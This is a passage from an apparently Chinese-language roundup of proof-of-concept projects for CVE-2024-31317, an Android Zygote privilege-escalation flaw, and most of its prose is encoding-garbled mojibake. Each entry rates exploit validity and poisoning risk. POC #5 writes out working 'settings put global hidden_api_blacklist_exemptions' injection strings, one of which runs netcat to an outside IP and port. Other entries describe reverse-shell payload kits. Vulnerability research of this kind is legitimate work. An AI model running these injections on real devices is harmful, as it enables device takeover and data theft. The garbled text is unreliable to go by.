ä½¿å…¶åœ¨å»ºç«‹è¿æ¥åæ‰§è¡ŒæŸäº›æ¶æ„æ“ä½œï¼Œæˆ–è€…å°†æ”¶é›†åˆ°çš„ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚ç”±äºè¿™ä¸ªæ¼æ´å…è®¸æ‰§è¡Œä»»æ„åº”ç”¨çš„ä»£ç ï¼Œå¦‚æœè¢«æ¶æ„åˆ©ç”¨ï¼Œå¯ä»¥é€ æˆå¾ˆå¤§çš„å±å®³ã€‚

åˆ©ç”¨æ–¹å¼ï¼š

1.  **æƒé™è·å–:** æ”»å‡»è€…éœ€è¦å…ˆè·å¾— `WRITE_SECURE_SETTINGS` æƒé™ã€‚
2.  **æ„é€ æ¶æ„æ•°æ®:**  æ„é€ åŒ…å«æ¶æ„ä»£ç çš„ååºåˆ—åŒ–æ•°æ®ã€‚
3.  **åˆ©ç”¨ ZygoteProcess:**  å°†æ¶æ„æ•°æ®ä¼ é€’ç»™å­˜åœ¨æ¼æ´çš„ `ZygoteProcess.java` å‡½æ•°ã€‚
4.  **ä»£ç æ‰§è¡Œ:**  åˆ©ç”¨ Zygote è¿›ç¨‹çš„æƒé™æ‰§è¡Œä»»æ„ä»£ç ï¼Œå®ç°æƒé™æå‡ã€‚

è¯¥`Android_Zygote_Research_Kit.sh`è„šæœ¬åªæ˜¯ä¸€ä¸ªè¾…åŠ©åˆ©ç”¨å·¥å…·ï¼Œç”¨äºç”Ÿæˆæ‰€éœ€çš„æ–‡ä»¶ï¼Œå¹¶æ²¡æœ‰æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [mianliupindao/CVE-2024-31317-PoC-Deployer](https://github.com/mianliupindao/CVE-2024-31317-PoC-Deployer)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---



---

## POC #2

**æ¥æº**: [CVE-2024-31317-JadeByteZen_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-JadeByteZen_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317-Android Zygote Deserialization

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** æƒé™æå‡

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œå’Œæƒé™æå‡

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰§è¡Œæƒé™(User execution privileges needed)ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317 æ¼æ´å­˜åœ¨äºAndroidç³»ç»Ÿçš„Zygoteè¿›ç¨‹ä¸­ï¼Œç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–å¯¼è‡´å¯ä»¥é€šè¿‡`WRITE_SECURE_SETTINGS`æƒé™å®ç°ä»£ç æ‰§è¡Œã€‚è¯¥æ¼æ´å½±å“Android 12ã€12Lã€13å’Œ14ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´æå‡æƒé™ï¼Œåœ¨å—å½±å“çš„è®¾å¤‡ä¸Šä»¥ä»»ä½•åº”ç”¨ç¨‹åºçš„èº«ä»½æ‰§è¡Œä»£ç ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼š**  `ZygoteProcess.java`ä¸­çš„å¤šä¸ªå‡½æ•°å­˜åœ¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **æƒé™æå‡ï¼š** æ”»å‡»è€…éœ€è¦`WRITE_SECURE_SETTINGS`æƒé™ï¼Œè¿™ä¸ªæƒé™é€šå¸¸éœ€è¦é€šè¿‡å…¶ä»–æ¼æ´æˆ–è€…é€šè¿‡æ¬ºéª—ç”¨æˆ·æˆäºˆã€‚å¦‚æœæ”»å‡»è€…æ‹¥æœ‰äº†è¿™ä¸ªæƒé™,ä»–ä»¬å°±å¯ä»¥é€šè¿‡Zygoteè¿›ç¨‹æ‰§è¡Œä»£ç ï¼Œæ¨¡æ‹Ÿä»»ä½•appçš„èº«ä»½ã€‚
3.  **ä»£ç æ‰§è¡Œï¼š**  é€šè¿‡åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡è®¾å¤‡ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**POCæœ‰æ•ˆæ€§åˆ†æï¼š**

æä¾›çš„`Android_Zygote_Research_Kit.sh`è„šæœ¬åŒ…å«ä»¥ä¸‹ç»„ä»¶ï¼š

*   `reverse_shell.c`ï¼šä¸€ä¸ªåå‘shellç¨‹åºï¼Œç”¨äºåœ¨ç›®æ ‡è®¾å¤‡ä¸Šå»ºç«‹ä¸æ”»å‡»è€…çš„è¿æ¥ã€‚
*   `payload91011.txt` å’Œ `payload1213.txt`ï¼šé’ˆå¯¹ä¸åŒAndroidç‰ˆæœ¬çš„æ¼æ´åˆ©ç”¨payloadã€‚
*   `compile.sh`ï¼šç”¨äºç¼–è¯‘åå‘shellç¨‹åºçš„è„šæœ¬ã€‚
*   `README.txt` å’Œ `CVE-2024-31317.txt`ï¼šæä¾›æ¼æ´åˆ©ç”¨çš„è¯´æ˜å’ŒæŠ€æœ¯åˆ†æã€‚

è¯¥è„šæœ¬é€šè¿‡ç”Ÿæˆæ¶æ„payloadå¹¶ç»“åˆåå‘shellç¨‹åºï¼Œå®ç°äº†å¯¹CVE-2024-31317æ¼æ´çš„åˆ©ç”¨ã€‚å› æ­¤ï¼Œæä¾›çš„POCä»£ç è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥ç”¨æ¥éªŒè¯å’Œåˆ©ç”¨è¯¥æ¼æ´ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è™½ç„¶è„šæœ¬ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æ¼æ´ç ”ç©¶å’Œåˆ©ç”¨ï¼Œä½†ä»ç„¶å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼š

*   **åå‘Shellçš„æ½œåœ¨é£é™©ï¼š** `reverse_shell.c`æœ¬èº«å¯ä»¥è¢«è§†ä¸ºä¸€ç§åé—¨ã€‚ä¸€æ—¦æˆåŠŸåˆ©ç”¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è·å¾—è®¾å¤‡çš„æ§åˆ¶æƒï¼Œæ‰§è¡Œæ¶æ„æ“ä½œã€‚
*   **å…¶ä»–æ¶æ„ä»£ç æ¤å…¥é£é™©ï¼š** è„šæœ¬ä¸­å¯èƒ½åŒ…å«å…¶ä»–æœªå£°æ˜çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ä¿¡æ¯æ”¶é›†ã€æ¶æ„è½¯ä»¶ä¼ æ’­ç­‰ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©å­˜åœ¨ï¼Œä½†ä¸»è¦é£é™©é›†ä¸­åœ¨åå‘shellçš„åŠŸèƒ½ä¸Šï¼Œä»¥åŠè„šæœ¬ä½œè€…å¯èƒ½æ¤å…¥çš„æ½œåœ¨æ¶æ„ä»£ç ã€‚è€ƒè™‘åˆ°ä½œè€…å£°æ˜çš„MITå¼€æºåè®®ä»¥åŠä»£ç ä¸­æ˜æ˜¾çš„åŠŸèƒ½å®ç°ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œå¤§çº¦ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [JadeByteZen/CVE-2024-31317-PoC-Deployer](https://github.com/JadeByteZen/CVE-2024-31317-PoC-Deployer)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #3

**æ¥æº**: [CVE-2024-31317-Webldix_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-Webldix_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317-Android Zygote Deserialization

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ç‰¹æƒæå‡

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´ä»»æ„åº”ç”¨ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦`WRITE_SECURE_SETTINGS`æƒé™å’Œç”¨æˆ·æ‰§è¡Œæƒé™ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-31317æ˜¯Androidç³»ç»Ÿä¸­çš„ä¸€ä¸ªç‰¹æƒæå‡æ¼æ´ï¼Œå­˜åœ¨äº`ZygoteProcess.java`çš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡`WRITE_SECURE_SETTINGS`æƒé™åœ¨ä»»ä½•åº”ç”¨ä¸­æ‰§è¡Œä»£ç ã€‚æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œåˆ©ç”¨æ­¤æ¼æ´æ— éœ€ç”¨æˆ·äº¤äº’ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´åœ¨Zygoteè¿›ç¨‹ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼Œè¿›è€Œæ§åˆ¶æ–°åˆ›å»ºçš„åº”ç”¨è¿›ç¨‹ã€‚æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ›´åƒä¸€ä¸ªåå‘shellçš„ç”Ÿæˆè„šæœ¬ï¼Œæœ¬èº«ä¸ç›´æ¥åŒ…å«æ¼æ´åˆ©ç”¨ä»£ç ï¼Œä½†è„šæœ¬ç”Ÿæˆçš„åå‘shellå¯ä»¥é€šè¿‡æ¼æ´åˆ©ç”¨payloadæ‰§è¡Œï¼Œé—´æ¥å®Œæˆæ¼æ´åˆ©ç”¨è¿‡ç¨‹ã€‚ æŠ•æ¯’é£é™©è¯„ä¼°ä¸º5%ï¼Œä¸»è¦æ˜¯å› ä¸ºè„šæœ¬æœ¬èº«ä¼šä»å¤–éƒ¨å¯¼å…¥payloadï¼Œå­˜åœ¨payloadè¢«æ›¿æ¢çš„é£é™©ï¼Œä¸”è„šæœ¬ä½œè€…å£°æ˜äº†å…è´£æ¡æ¬¾ï¼Œæš—ç¤ºå­˜åœ¨ä¸€å®šé£é™©ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**

æ ¹æ®æœç´¢ç»“æœå’Œæ¼æ´æè¿°ï¼Œæ¼æ´æ˜¯ç”±äº`ZygoteProcess.java`ä¸­å­˜åœ¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–é€ æˆçš„ï¼Œé€šè¿‡`WRITE_SECURE_SETTINGS`æƒé™ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„åº”ç”¨çš„ä»£ç ã€‚æä¾›çš„è„šæœ¬åˆ›å»ºäº†ä¸€ä¸ªåå‘shellï¼Œè¯¥åå‘shelléœ€è¦è¢«æ³¨å…¥åˆ°åˆ©ç”¨é“¾ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–`WRITE_SECURE_SETTINGS`æƒé™ï¼š** æ”»å‡»è€…éœ€è¦é¦–å…ˆè·å–`WRITE_SECURE_SETTINGS`æƒé™ã€‚è¿™å¯ä»¥é€šè¿‡å·²æœ‰çš„æ¼æ´ã€æƒé™æå‡æˆ–è€…æ¶æ„åº”ç”¨æ¥å®ç°ã€‚
2.  **æ„é€ æ¶æ„Payloadï¼š**  åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ï¼Œæ„é€ æ¶æ„çš„payloadï¼Œè¯¥payloadä¼šæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„ä»£ç ï¼Œä¾‹å¦‚ï¼Œå¯åŠ¨ä¸€ä¸ªåå‘shellã€‚
3.  **åˆ©ç”¨Zygoteè¿›ç¨‹ï¼š**  é€šè¿‡æŸç§æ–¹å¼è§¦å‘Zygoteè¿›ç¨‹æ‰§è¡ŒåŒ…å«æ¶æ„payloadçš„ååºåˆ—åŒ–æ“ä½œã€‚
4.  **ä»£ç æ‰§è¡Œï¼š**  å½“Zygoteè¿›ç¨‹ååºåˆ—åŒ–æ¶æ„æ•°æ®æ—¶ï¼Œæ”»å‡»è€…çš„ä»£ç å°†åœ¨ç›®æ ‡åº”ç”¨è¿›ç¨‹ä¸­æ‰§è¡Œï¼Œä»è€Œå®ç°æƒé™æå‡ã€‚
5.  **åå‘Shellè¿æ¥:** æ”»å‡»è€…é€šè¿‡é¢„è®¾çš„IPå’Œç«¯å£æ¥æ”¶åå‘shellï¼Œä»è€Œæ§åˆ¶è®¾å¤‡

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„è„šæœ¬ä¸»è¦ç”¨äºç”Ÿæˆåå‘shellç›¸å…³çš„ä»£ç ï¼Œæœ¬èº«çœ‹èµ·æ¥æ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºã€‚ä½†éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

*   **Payloadçš„æ½œåœ¨é£é™©ï¼š** è¯¥è„šæœ¬ä¾èµ–äºå¤–éƒ¨æä¾›çš„payloadã€‚å¦‚æœpayloadè¢«æ›¿æ¢ä¸ºæ¶æ„ä»£ç ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ›´ä¸¥é‡çš„åæœã€‚
*   **åå‘Shellé£é™©ï¼š** åå‘shellæœ¬èº«å…·æœ‰é£é™©ï¼Œå¯èƒ½è¢«ç”¨äºéæ³•ç›®çš„ï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·æ•°æ®ã€è¿œç¨‹æ§åˆ¶è®¾å¤‡ç­‰ã€‚
*   **è„šæœ¬ä½œè€…çš„å…è´£å£°æ˜:** è„šæœ¬ä½œè€…å£°æ˜äº†å…è´£æ¡æ¬¾ï¼Œæš—ç¤ºå­˜åœ¨ä¸€å®šé£é™©ã€‚

ç»¼åˆæ¥çœ‹ï¼Œè¯¥POCè„šæœ¬å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä½†é£é™©è¾ƒä½ï¼Œä¸»è¦é›†ä¸­åœ¨payloadçš„å®‰å…¨æ€§ä»¥åŠè„šæœ¬æœ¬èº«å¯èƒ½è¢«æ»¥ç”¨ä¸Šã€‚

**é¡¹ç›®åœ°å€:** [Webldix/CVE-2024-31317-PoC-Deployer](https://github.com/Webldix/CVE-2024-31317-PoC-Deployer)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #4

**æ¥æº**: [CVE-2024-31317-agg23_cve-2024-31317.md](../2024/CVE-2024-31317-agg23_cve-2024-31317.md)

## CVE-2024-31317-Android Zygote Deserialization

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ç‰¹æƒæå‡

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œå’Œæƒé™æå‡

**å½±å“ç‰ˆæœ¬:** 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦`WRITE_SECURE_SETTINGS`æƒé™å’Œç”¨æˆ·æ‰§è¡Œæƒé™

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317 æ˜¯ä¸€ä¸ª Android ç³»ç»Ÿä¸­çš„ç‰¹æƒæå‡æ¼æ´ï¼Œå­˜åœ¨äº `ZygoteProcess.java` çš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ‹¥æœ‰ `WRITE_SECURE_SETTINGS` æƒé™çš„åº”ç”¨æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ¨¡æ‹Ÿä»»ä½•å…¶ä»–åº”ç”¨ç¨‹åºçš„èº«ä»½ã€‚

**æ¼æ´åˆ©ç”¨æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´è¢«è®¤ä¸ºæ˜¯ Android ç”¨æˆ·æ€ä¸­æœ€æœ‰ä»·å€¼çš„æ¼æ´ä¹‹ä¸€ã€‚å¤šä¸ªæ¥æºï¼ˆå¦‚Metaå®‰å…¨åšå®¢ã€dawnslabã€flanker017åšå®¢ï¼‰éƒ½æä¾›äº†æ¼æ´åˆ†æå’Œåˆ©ç”¨æ–¹æ³•ï¼Œè¡¨æ˜è¯¥æ¼æ´çš„PoCæ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æä¾›çš„ PoC ä»£ç ä¸»è¦åŒ…å«æ¼æ´çš„è§£é‡Šã€Zygote å‚æ•°è¯´æ˜ä»¥åŠæ¨¡æ‹Ÿå™¨è®¾ç½®æŒ‡å—ï¼Œå¹¶æ²¡æœ‰æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ä½†è€ƒè™‘åˆ°ä»£ç ä¸­å¯èƒ½å­˜åœ¨éšè—çš„åé—¨æˆ–æœªå…¬å¼€çš„åˆ©ç”¨æ–¹å¼ï¼Œä¾‹å¦‚å¯¹ç³»ç»Ÿå±æ€§çš„æ¶æ„ä¿®æ”¹ï¼Œå› æ­¤å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚é£é™©è¯„ä¼°ä¸º10%ï¼Œé£é™©è¾ƒä½ä½†ä¸å¯å¿½è§†ã€‚ä¸»è¦é£é™©ç‚¹åœ¨äºåˆ©ç”¨`system`æƒé™æ‰§è¡ŒæœªçŸ¥çš„æ“ä½œï¼Œå¯èƒ½å­˜åœ¨éšè”½çš„æ¶æ„è¡Œä¸ºã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ©ç”¨å…·æœ‰ `WRITE_SECURE_SETTINGS` æƒé™çš„åº”ç”¨ç¨‹åºã€‚
2.  é€šè¿‡æ„é€ ç‰¹å®šçš„ Zygote å¯åŠ¨å‚æ•°ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ã€‚
3.  ä½¿ Zygote è¿›ç¨‹ä»¥ç›®æ ‡åº”ç”¨ç¨‹åºçš„ UID å’Œ SELinux ä¸Šä¸‹æ–‡å¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹ã€‚
4.  åœ¨æ–°è¿›ç¨‹ä¸­æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä»è€Œè·å¾—ç›®æ ‡åº”ç”¨ç¨‹åºçš„æƒé™ã€‚æ¯”å¦‚åˆ©ç”¨`shell`æƒé™å¯ä»¥æ‰§è¡Œadb shellå‘½ä»¤ï¼Œåˆ©ç”¨`system`æƒé™å¯ä»¥ä¿®æ”¹ç³»ç»Ÿå±æ€§ã€‚

æ€»è€Œè¨€ä¹‹ï¼Œæ¼æ´åˆ©ç”¨ä¾èµ–äºå¯¹ Zygote å¯åŠ¨å‚æ•°çš„ç²¾ç¡®æ„é€ ä»¥åŠç›®æ ‡ Android ç‰ˆæœ¬çš„ç‰¹æ€§ã€‚

**é¡¹ç›®åœ°å€:** [agg23/cve-2024-31317](https://github.com/agg23/cve-2024-31317)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #5

**æ¥æº**: [CVE-2024-31317-fuhei_CVE-2024-31317.md](../2024/CVE-2024-31317-fuhei_CVE-2024-31317.md)

## CVE-2024-31317 - Android Zygote Deserialization/Command Injection

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** æƒé™æå‡ (Elevation of Privilege)

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å®ç°æœ¬åœ°æƒé™æå‡ï¼Œä»¥ä»»æ„åº”ç”¨èº«ä»½æ‰§è¡Œä»£ç 

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ `WRITE_SECURE_SETTINGS` æƒé™ã€‚é€šå¸¸å¯é€šè¿‡ ADB æˆ–å…¶ä»–æ¼æ´è·å–ã€‚ä½ç‰ˆæœ¬Androidå¯ä»¥ç›´æ¥é€šè¿‡å‘½ä»¤æ³¨å…¥ï¼Œé«˜ç‰ˆæœ¬éœ€è¦Bypassæ–¹æ¡ˆã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317 å…è®¸æ”»å‡»è€…åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æˆ–å‘½ä»¤æ³¨å…¥ï¼Œåœ¨ Zygote è¿›ç¨‹ä¸­ä»¥ä»»æ„åº”ç”¨èº«ä»½æ‰§è¡Œä»£ç ã€‚è¯¥æ¼æ´å­˜åœ¨äº `ZygoteProcess.java` çš„å¤šä¸ªå‡½æ•°ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ `WRITE_SECURE_SETTINGS` æƒé™è®¾ç½®æ¶æ„çš„ `hidden_api_blacklist_exemptions` å€¼ï¼Œä»è€Œæ³¨å…¥æ¶æ„å‚æ•°ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– `WRITE_SECURE_SETTINGS` æƒé™ï¼š** è¿™æ˜¯åˆ©ç”¨è¯¥æ¼æ´çš„å‰ææ¡ä»¶ã€‚å¯ä»¥é€šè¿‡ ADB (å¦‚æœè®¾å¤‡å·²å¯ç”¨ USB è°ƒè¯•) æˆ–åˆ©ç”¨å…¶ä»–æ¼æ´æ¥è·å–æ­¤æƒé™ã€‚
2.  **æ„é€ æ¶æ„ `hidden_api_blacklist_exemptions` å€¼ï¼š** æ”»å‡»è€…éœ€è¦æ„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä½¿ç”¨ `settings put global hidden_api_blacklist_exemptions` å‘½ä»¤å°†å…¶å†™å…¥ç³»ç»Ÿè®¾ç½®ã€‚
3.  **è§¦å‘ Zygote è¿›ç¨‹ï¼š**  å†™å…¥è®¾ç½®åï¼Œå½“ç³»ç»Ÿå°è¯•ä½¿ç”¨è¢«ç¯¡æ”¹çš„ `hidden_api_blacklist_exemptions` æ—¶ï¼ŒZygote è¿›ç¨‹ä¼šæ‰§è¡Œæ³¨å…¥çš„æ¶æ„å‘½ä»¤ã€‚

**ä½ç‰ˆæœ¬ (Android 11 åŠä»¥ä¸‹) åˆ©ç”¨ï¼š**
å¯ä»¥ç›´æ¥é€šè¿‡æ¢è¡Œç¬¦è¿›è¡Œå‘½ä»¤æ³¨å…¥ã€‚
```
settings put global hidden_api_blacklist_exemptions "LClass1;->method1(\n8\n--runtime-args\n--setuid=1000\n--setgid=1000\n--nice-name=com.android.settings\n--app-data-dir=/data/user/0/com.android.settings\n--package-name=com.android.settings\n--seinfo=platform:system_app:targetSdkVersion=29:complete\nandroid.app.ActivityThread"
```
å¯ä»¥ä½¿ç”¨`invoke-with`å‚æ•°æ‰§è¡Œå‘½ä»¤ï¼Œä½†éœ€è¦å¼€å¯ debug æ¨¡å¼ï¼Œå¯ä»¥é€šè¿‡`runtime-flags`å‚æ•°è®¾ç½®æ‰€æœ‰debugå±æ€§ã€‚
```
settings put global hidden_api_blacklist_exemptions "LClass1;->method1(\n7\n--runtime-args\n--setuid=1000\n--setgid=1000\n--runtime-flags=43267\n--invoke-with\nnc 192.168.0.112 9981;\n--seinfo=platform:system_app:targetSdkVersion=29:complete"
```

**é«˜ç‰ˆæœ¬ (Android 12 åŠä»¥ä¸Š) åˆ©ç”¨ï¼š**
ç”±äº Google åœ¨ Android 12 ä¸­å¼•å…¥äº† C++ å‘½ä»¤è§£æå™¨ï¼Œç®€å•çš„å‘½ä»¤æ³¨å…¥ä¸å†æœ‰æ•ˆã€‚éœ€è¦ä½¿ç”¨æ›´å¤æ‚çš„ç»•è¿‡æ–¹æ³•ï¼Œä¾‹å¦‚ï¼Œåœ¨æ³¨å…¥çš„æ¶æ„å‘½ä»¤ä¹‹å‰å¡«å……å¤§é‡é€—å·ä»¥å¢åŠ æ—¶é—´é—´éš”ï¼Œä»è€Œç»•è¿‡ `NativeCommandBuffer` çš„é™åˆ¶ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´ä¿¡æ¯å’Œåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´çš„ PoC ä»£ç åº”è¯¥æ˜¯æœ‰æ•ˆçš„ã€‚å¤šä¸ªæœç´¢å¼•æ“ç»“æœéƒ½æåˆ°äº†è¯¥æ¼æ´çš„åˆ©ç”¨ï¼Œå¹¶æä¾›äº†ç›¸å…³çš„åˆ†æå’Œå‚è€ƒé“¾æ¥ã€‚æä¾›çš„åˆ©ç”¨ä»£ç ä¹ŸåŒ…å«äº†ä½ç‰ˆæœ¬å’Œé«˜ç‰ˆæœ¬çš„åˆ©ç”¨æ–¹æ³•ï¼Œå¹¶ç»™å‡ºäº†è¯¦ç»†çš„æ­¥éª¤å’Œç¤ºä¾‹ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**
è¯¥ä»“åº“ä¸»è¦åŒ…å«æ¼æ´åˆ©ç”¨çš„è¯´æ˜æ–‡æ¡£å’Œä¸€äº›æ„å»ºæ–‡ä»¶ã€‚è™½ç„¶æ— æ³•å®Œå…¨æ’é™¤æŠ•æ¯’çš„å¯èƒ½æ€§ï¼Œä½†ä»ç›®å‰çš„ä»£ç æ¥çœ‹ï¼Œé£é™©è¾ƒä½ã€‚é£é™©ç‚¹å¯èƒ½å­˜åœ¨äºåˆ©ç”¨è„šæœ¬ä¸­ï¼Œä¾‹å¦‚æ‰§è¡Œ nc å‘½ä»¤ï¼Œè™½ç„¶æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ç½‘ç»œå·¥å…·ï¼Œä½†æ˜¯å­˜åœ¨è¢«åˆ©ç”¨çš„é£é™©ï¼Œä¾‹å¦‚è¿æ¥åˆ°æ¶æ„çš„æœåŠ¡å™¨ã€‚gradleæ–‡ä»¶é£é™©è¾ƒå°ï¼Œä¸»è¦æ˜¯æ„å»ºé…ç½®ï¼Œä½†ç†è®ºä¸Šå­˜åœ¨è¿œç¨‹ä¾èµ–å¼•å…¥æ¶æ„ä»£ç çš„å¯èƒ½æ€§ã€‚ç»¼åˆè¯„ä¼°ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [fuhei/CVE-2024-31317](https://github.com/fuhei/CVE-2024-31317)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #6

**æ¥æº**: [CVE-2024-31317-jmywh1_CVE-2024-31317.md](../2024/CVE-2024-31317-jmywh1_CVE-2024-31317.md)

## CVE-2024-31317-Android-Zygoteååºåˆ—åŒ–æ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ååºåˆ—åŒ–æ¼æ´

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä»»æ„åº”ç”¨ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦`android.permission.WRITE_SECURE_SETTINGS`æƒé™ï¼Œç”¨æˆ·äº¤äº’ä¸æ˜¯å¿…é¡»çš„

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

